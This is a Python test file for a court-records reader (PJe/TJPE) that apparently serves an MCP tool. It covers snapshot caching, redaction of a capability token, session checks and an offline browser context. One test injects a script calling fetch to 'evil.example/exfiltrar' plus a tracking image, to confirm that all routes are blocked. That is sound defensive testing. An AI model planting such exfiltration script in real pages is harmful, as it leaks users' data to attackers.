from __future__ import annotations

# pyright: reportPrivateUsage=false
from collections.abc import AsyncGenerator, Awaitable, Callable
from contextlib import asynccontextmanager
from pathlib import Path
from typing import cast

import pytest
from playwright.async_api import Browser, BrowserContext, Page, Route, async_playwright

import mcp_pje_tjpe.pje_read as pje_read
from mcp_pje_tjpe.config import Settings
from mcp_pje_tjpe.errors import (
    CredenciaisAusentesError,
    InterfacePjeAlteradaError,
    ValidacaoError,
)
from mcp_pje_tjpe.models import AutosDigitais, Grau
from mcp_pje_tjpe.pje_auth import PjeSessionManager, ReadSessionLease
from mcp_pje_tjpe.pje_read import PjeReadService, _AcervoBinding


def _synthetic_npu(
    sequence: str = "9999999",
    *,
    year: str = "2099",
    origin: str = "9999",
) -> str:
    base = sequence + year + "8" + "17" + origin + "00"
    check_digits = 98 - (int(base) % 97)
    return f"{sequence}-{check_digits:02d}.{year}.8.17.{origin}"


def _autos_url(
    process_id: str,
    *,
    grau: Grau = Grau.PRIMEIRO,
    auth_code: str = "Capability_Secret_123",
) -> str:
    return (
        f"https://pje.cloud.tjpe.jus.br/{grau.value}/Processo/ConsultaProcesso/"
        "Detalhe/listProcessoCompletoAdvogado.seam"
        f"?id={process_id}&ca={auth_code}"
    )


def _autos_html(numero: str, *, auth_code: str = "Capability_Secret_123") -> str:
    return f"""
        <!doctype html>
        <html>
          <head><title>Autos digitais</title></head>
          <body>
            <h1>{numero}</h1>
            <section>
              <div>Classe judicial</div>
              <div>Procedimento Comum Cível</div>
              <div>Assunto</div>
              <div>Responsabilidade Civil</div>
            </section>
            <a href="detalhe.seam?id=20&amp;ca={auth_code}">rota interna</a>
            <form id="divTimeLine">
              <div class="media data">
                <span class="data-interna">01/09/2099 10:00</span>
              </div>
              <div class="media tipo-D">
                <div class="media-body">Documento juntado em 01/09/2099 10:00</div>
                <a onclick="abrirLinkDocumento('321')">
                  <span class="title">321 - Petição inicial</span>
                </a>
              </div>
              <div class="media tipo-M">
                <div class="media-body">Conclusão ao magistrado</div>
              </div>
            </form>
          </body>
        </html>
    """


def _lease(
    *,
    generation: str = "generation-a",
    grau: Grau = Grau.PRIMEIRO,
    context: BrowserContext | None = None,
    page: Page | None = None,
) -> ReadSessionLease:
    return ReadSessionLease(
        grau=grau,
        context=context or cast(BrowserContext, object()),
        page=page or cast(Page, object()),
        generation=generation,
    )


def _service(tmp_path: Path, *, registry_limit: int = 5_000) -> PjeReadService:
    return PjeReadService(
        cast(PjeSessionManager, object()),
        Settings(
            data_dir=tmp_path / "data",
            downloads_dir=tmp_path / "downloads",
        ),
        registry_limit=registry_limit,
    )


class _FakeSessions:
    def __init__(self, lease: ReadSessionLease) -> None:
        self.lease = lease
        self.calls: list[Grau] = []
        self.cached_calls: list[Grau] = []

    @asynccontextmanager
    async def read_session(self, grau: Grau) -> AsyncGenerator[ReadSessionLease]:
        self.calls.append(grau)
        assert grau is self.lease.grau
        yield self.lease

    @asynccontextmanager
    async def cached_read_session(self, grau: Grau) -> AsyncGenerator[ReadSessionLease]:
        self.cached_calls.append(grau)
        assert grau is self.lease.grau
        yield self.lease


class _BodyLocator:
    def __init__(self, text: str) -> None:
        self.text = text

    async def inner_text(self) -> str:
        return self.text


class _OfflinePage:
    def __init__(self, body_text: str) -> None:
        self.body_text = body_text
        self.default_timeouts: list[float] = []
        self.set_content_calls: list[tuple[str, str, float]] = []
        self.goto_calls = 0

    def set_default_timeout(self, timeout: float) -> None:
        self.default_timeouts.append(timeout)

    async def set_content(
        self,
        html: str,
        *,
        wait_until: str,
        timeout: float,  # noqa: ASYNC109 - espelha Playwright
    ) -> None:
        self.set_content_calls.append((html, wait_until, timeout))

    def locator(self, selector: str) -> _BodyLocator:
        assert selector == "body"
        return _BodyLocator(self.body_text)

    async def goto(self, _url: str) -> None:
        self.goto_calls += 1
        raise AssertionError("o leitor do cache não pode navegar")


class _OfflineContext:
    def __init__(self, page: _OfflinePage) -> None:
        self.page = page
        self.routes: list[tuple[str, Callable[[Route], Awaitable[None]]]] = []
        self.new_page_calls = 0
        self.close_calls = 0

    async def route(
        self,
        pattern: str,
        handler: Callable[[Route], Awaitable[None]],
    ) -> None:
        self.routes.append((pattern, handler))

    async def new_page(self) -> Page:
        self.new_page_calls += 1
        return cast(Page, self.page)

    async def close(self) -> None:
        self.close_calls += 1


class _Browser:
    def __init__(self, offline_context: _OfflineContext) -> None:
        self.offline_context = offline_context
        self.new_context_calls: list[dict[str, object]] = []

    async def new_context(
        self,
        *,
        accept_downloads: bool,
        java_script_enabled: bool,
        service_workers: str,
    ) -> BrowserContext:
        self.new_context_calls.append(
            {
                "accept_downloads": accept_downloads,
                "java_script_enabled": java_script_enabled,
                "service_workers": service_workers,
            }
        )
        return cast(BrowserContext, self.offline_context)


class _AuthenticatedContext:
    def __init__(self, browser: _Browser) -> None:
        self.browser = cast(Browser, browser)


class _BlockedRoute:
    def __init__(self) -> None:
        self.abort_calls: list[str] = []

    async def abort(self, error_code: str) -> None:
        self.abort_calls.append(error_code)


@pytest.fixture
def anyio_backend() -> str:
    return "asyncio"


def test_search_cache_binding_is_scoped_and_redacts_capability(tmp_path: Path) -> None:
    service = _service(tmp_path)
    numero = _synthetic_npu()
    secret = "Capability_Secret_123"
    lease = _lease()

    service.registrar_autos_pesquisa_geral(
        lease,
        numero,
        "20",
        _autos_url("20", auth_code=secret),
        _autos_html(numero, auth_code=secret),
    )

    binding = service._require_pesquisa_geral_binding(lease, numero)
    assert binding.generation == "generation-a"
    assert binding.grau is Grau.PRIMEIRO
    assert binding.numero == numero
    assert binding.processo_id == "20"
    assert secret not in binding.autos_html
    assert "ca=REDACTED" in binding.autos_html
    assert secret not in repr(binding)
    assert "generation-a" not in repr(binding)
    assert "processo_id" not in repr(binding)
    assert "autos_html" not in repr(binding)

    for incompatible in (
        _lease(generation="generation-b"),
        _lease(grau=Grau.SEGUNDO),
    ):
        with pytest.raises(ValidacaoError, match="sessão e grau"):
            service._require_pesquisa_geral_binding(incompatible, numero)

    with pytest.raises(ValidacaoError, match="sessão e grau"):
        service._require_pesquisa_geral_binding(lease, _synthetic_npu("9999998"))

    with pytest.raises(InterfacePjeAlteradaError, match="processo e grau"):
        service.registrar_autos_pesquisa_geral(
            lease,
            numero,
            "21",
            _autos_url("20"),
            _autos_html(numero),
        )
    with pytest.raises(InterfacePjeAlteradaError, match="processo e grau"):
        service.registrar_autos_pesquisa_geral(
            lease,
            numero,
            "20",
            _autos_url("20", grau=Grau.SEGUNDO),
            _autos_html(numero),
        )


@pytest.mark.parametrize(
    ("autos_html", "error", "message"),
    [
        (
            '<!doctype html><html><body><form id="kc-form-login" name="username">'
            "sessão encerrada</form></body></html>",
            CredenciaisAusentesError,
            "sessão expirou",
        ),
        (
            '<!doctype html><html><head><meta http-equiv="refresh" content="0;url=/login">'
            "</head><body>{numero}</body></html>",
            InterfacePjeAlteradaError,
            "renovar a navegação",
        ),
        (
            "<!doctype html><html><body>outro processo</body></html>",
            InterfacePjeAlteradaError,
            "não confirmou o NPU",
        ),
        (
            "<!doctype html><html><body>{numero} — processo sigiloso</body></html>",
            ValidacaoError,
            "sigilo, restrição",
        ),
    ],
)
def test_search_cache_rejects_invalid_html(
    tmp_path: Path,
    autos_html: str,
    error: type[Exception],
    message: str,
) -> None:
    service = _service(tmp_path)
    numero = _synthetic_npu()
    rendered = autos_html.format(numero=numero)

    with pytest.raises(error, match=message):
        service.registrar_autos_pesquisa_geral(
            _lease(),
            numero,
            "20",
            _autos_url("20"),
            rendered,
        )


def test_search_cache_enforces_html_byte_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    service = _service(tmp_path)
    numero = _synthetic_npu()
    monkeypatch.setattr(pje_read, "_MAX_AUTOS_HTML_BYTES", 128)

    with pytest.raises(ValidacaoError, match="teto local"):
        service.registrar_autos_pesquisa_geral(
            _lease(),
            numero,
            "20",
            _autos_url("20"),
            f"<!doctype html><html><body>{numero}{'x' * 256}</body></html>",
        )


def test_search_cache_rejects_non_html_payload(tmp_path: Path) -> None:
    service = _service(tmp_path)
    numero = _synthetic_npu()

    with pytest.raises(InterfacePjeAlteradaError, match="HTML"):
        service.registrar_autos_pesquisa_geral(
            _lease(),
            numero,
            "20",
            _autos_url("20"),
            f"conteúdo textual sem documento HTML: {numero}",
        )


def test_search_cache_rejects_login_marker_after_first_8_kib(tmp_path: Path) -> None:
    service = _service(tmp_path)
    numero = _synthetic_npu()
    payload = (
        f"<!doctype html><html><body>{numero}"
        + ("x" * 9_000)
        + '<form id="kc-form-login"><input name="username"></form></body></html>'
    )

    with pytest.raises(CredenciaisAusentesError, match="sessão expirou"):
        service.registrar_autos_pesquisa_geral(
            _lease(),
            numero,
            "20",
            _autos_url("20"),
            payload,
        )


@pytest.mark.anyio
async def test_cached_autos_reader_is_offline_and_blocks_every_route(tmp_path: Path) -> None:
    service = _service(tmp_path)
    numero = _synthetic_npu()
    secret = "Capability_Secret_123"
    offline_page = _OfflinePage(numero)
    offline_context = _OfflineContext(offline_page)
    browser = _Browser(offline_context)
    context = _AuthenticatedContext(browser)
    lease = _lease(context=cast(BrowserContext, context))
    hostile_html = _autos_html(numero, auth_code=secret).replace(
        "</body>",
        '<script>fetch("https://evil.example/exfiltrar")</script>'
        '<img src="https://evil.example/rastreio.png"></body>',
    )
    service.registrar_autos_pesquisa_geral(
        lease,
        numero,
        "20",
        _autos_url("20", auth_code=secret),
        hostile_html,
    )
    binding = service._require_pesquisa_geral_binding(lease, numero)

    page, returned_context, process_id = await service._open_cached_pesquisa_geral(
        lease,
        binding,
    )

    assert page is cast(Page, offline_page)
    assert returned_context is cast(BrowserContext, offline_context)
    assert process_id == "20"
    assert browser.new_context_calls == [
        {
            "accept_downloads": False,
            "java_script_enabled": False,
            "service_workers": "block",
        }
    ]
    assert offline_context.routes[0][0] == "**/*"
    assert offline_context.new_page_calls == 1
    assert offline_page.goto_calls == 0
    assert secret not in offline_page.set_content_calls[0][0]

    blocked_route = _BlockedRoute()
    await offline_context.routes[0][1](cast(Route, blocked_route))
    assert blocked_route.abort_calls == ["blockedbyclient"]

    await returned_context.close()
    assert offline_context.close_calls == 1


@pytest.mark.anyio
async def test_search_cache_consults_snapshot_but_keeps_documents_and_pjedocs_acervo_only(
    tmp_path: Path,
) -> None:
    numero = _synthetic_npu()
    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch(headless=True)
        context = await browser.new_context()
        try:
            source_page = await context.new_page()
            lease = _lease(context=context, page=source_page)
            sessions = _FakeSessions(lease)
            service = PjeReadService(
                cast(PjeSessionManager, sessions),
                Settings(
                    data_dir=tmp_path / "data",
                    downloads_dir=tmp_path / "downloads",
                ),
            )
            service.registrar_autos_pesquisa_geral(
                lease,
                numero,
                "20",
                _autos_url("20"),
                _autos_html(numero),
            )

            autos = await service.consultar_autos(
                numero,
                Grau.PRIMEIRO,
                limite_documentos=10,
                limite_movimentos=10,
            )

            assert autos.numero == numero
            assert autos.grau is Grau.PRIMEIRO
            assert autos.origem == "pesquisa_geral"
            assert autos.cabecalho["Classe judicial"] == "Procedimento Comum Cível"
            assert len(autos.documentos) == 1
            assert autos.documentos[0].id_exibido == "321"
            assert autos.documentos[0].conteudo_disponivel is False
            assert autos.movimentos
            assert "Nenhuma requisição ao tribunal" in autos.aviso
            assert sessions.calls == []
            assert sessions.cached_calls == [Grau.PRIMEIRO]

            reference = autos.documentos[0].referencia
            with pytest.raises(ValidacaoError, match="pesquisa geral"):
                await service.ler_documento(numero, Grau.PRIMEIRO, reference)
            with pytest.raises(ValidacaoError, match="pesquisa geral"):
                await service.baixar_documento(numero, Grau.PRIMEIRO, reference)
            with pytest.raises(ValidacaoError, match="Acervo"):
                await service.preparar_alvo_pjedocs(lease, numero)
        finally:
            await context.close()
            await browser.close()


@pytest.mark.anyio
async def test_stale_search_snapshot_does_not_shadow_current_acervo(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    numero = _synthetic_npu()
    current_lease = _lease(generation="generation-b")
    sessions = _FakeSessions(current_lease)
    service = PjeReadService(
        cast(PjeSessionManager, sessions),
        Settings(data_dir=tmp_path / "data", downloads_dir=tmp_path / "downloads"),
    )
    service.registrar_autos_pesquisa_geral(
        _lease(generation="generation-a"),
        numero,
        "20",
        _autos_url("20"),
        _autos_html(numero),
    )
    # O vínculo do Acervo é pré-requisito do caminho autenticado, e o fluxo real o
    # cria em listar_acervo. Aqui ele é semeado direto porque o teste dubla a
    # navegação: o que está sob prova é o roteamento, não a autorização.
    service._acervo[(current_lease.generation, Grau.PRIMEIRO, numero)] = _AcervoBinding(
        generation=current_lease.generation,
        grau=Grau.PRIMEIRO,
        numero=numero,
        processo_id="20",
        autos_url=_autos_url("20"),
        jurisdicao="Recife - Varas",
    )
    expected = cast(AutosDigitais, object())

    async def load_acervo(
        _page: Page, _grau: Grau, _jurisdicao: str | None = None
    ) -> None:
        return None

    async def refresh_acervo(_lease: ReadSessionLease, _numero: str) -> None:
        return None

    async def open_acervo(
        _lease: ReadSessionLease,
        _numero: str,
    ) -> tuple[Page, BrowserContext, str]:
        return cast(Page, object()), cast(BrowserContext, object()), "20"

    async def build_model(*_args: object, **_kwargs: object) -> AutosDigitais:
        return expected

    monkeypatch.setattr(service, "_load_acervo", load_acervo)
    monkeypatch.setattr(service, "_refresh_acervo_binding", refresh_acervo)
    monkeypatch.setattr(service, "_open_autos_from_acervo", open_acervo)
    monkeypatch.setattr(service, "_build_autos_model", build_model)

    result = await service.consultar_autos(numero, Grau.PRIMEIRO)

    assert result is expected
    assert sessions.cached_calls == [Grau.PRIMEIRO]
    assert sessions.calls == [Grau.PRIMEIRO]


def test_search_cache_uses_lru_and_refreshes_on_read(tmp_path: Path) -> None:
    service = _service(tmp_path, registry_limit=2)
    lease = _lease()
    first = _synthetic_npu("9999999")
    second = _synthetic_npu("9999998")
    third = _synthetic_npu("9999997")

    for numero, process_id in ((first, "20"), (second, "21")):
        service.registrar_autos_pesquisa_geral(
            lease,
            numero,
            process_id,
            _autos_url(process_id),
            _autos_html(numero),
        )

    service._require_pesquisa_geral_binding(lease, first)
    service.registrar_autos_pesquisa_geral(
        lease,
        third,
        "22",
        _autos_url("22"),
        _autos_html(third),
    )

    assert list(service._pesquisa_geral) == [
        (lease.generation, lease.grau, first),
        (lease.generation, lease.grau, third),
    ]
    with pytest.raises(ValidacaoError, match="sessão e grau"):
        service._require_pesquisa_geral_binding(lease, second)
